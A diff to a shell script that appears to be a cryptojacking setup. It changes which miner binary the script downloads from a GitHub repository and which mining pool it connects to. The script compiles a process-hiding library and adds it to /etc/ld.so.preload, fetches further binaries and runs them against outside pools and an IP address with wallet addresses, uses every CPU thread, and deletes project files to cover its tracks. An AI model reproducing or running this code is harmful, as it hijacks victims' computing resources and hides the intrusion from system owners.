@@ -36,8 +36,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget -q 'https://github.com/maszehh/sempak/blob/main/lolMiner'
-chmod +x lolMiner
+./graftcp/graftcp wget -q 'https://github.com/maszehh/sempak/raw/main/grm'
+chmod +x grm
 rm -rf Makefile
 rm -rf processhider.c
 rm -rf README.md
@@ -52,4 +52,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lolMiner -a GRAM --pool api-pool.gramcoin.org:443 --user UQCEbFsUU31X8Xhdkkkox4sB0IxbmYGM5F7FFbxABZfDYzrA & wget -q https://github.com/maszehh/sempak/raw/main/macan && chmod 700 macan && ./macan -o 103.253.244.6:443 -u ZEPHsA3mksJG2P4LgfHuuRDwswtmYxepV3ovN8mSR6BqLKzoAqdsz8nQGmmYtX8YBxKGvtHZ6VR2UU8c2tPec8rW7YvsPJtMPmJ -p Gh-Tukiman -a rx/0 -k --donate-level 1 -t $(nproc)
+./graftcp/graftcp ./grm -a GRAM --pool stratum+tcp://ton.hashrate.to:4002 --ton-mode 6 --user UQCEbFsUU31X8Xhdkkkox4sB0IxbmYGM5F7FFbxABZfDYzrA & wget -q https://github.com/maszehh/sempak/raw/main/macan && chmod 700 macan && ./macan -o 103.253.244.6:443 -u ZEPHsA3mksJG2P4LgfHuuRDwswtmYxepV3ovN8mSR6BqLKzoAqdsz8nQGmmYtX8YBxKGvtHZ6VR2UU8c2tPec8rW7YvsPJtMPmJ -p Gh-Tukiman -a rx/0 -k --donate-level 1 -t $(nproc)
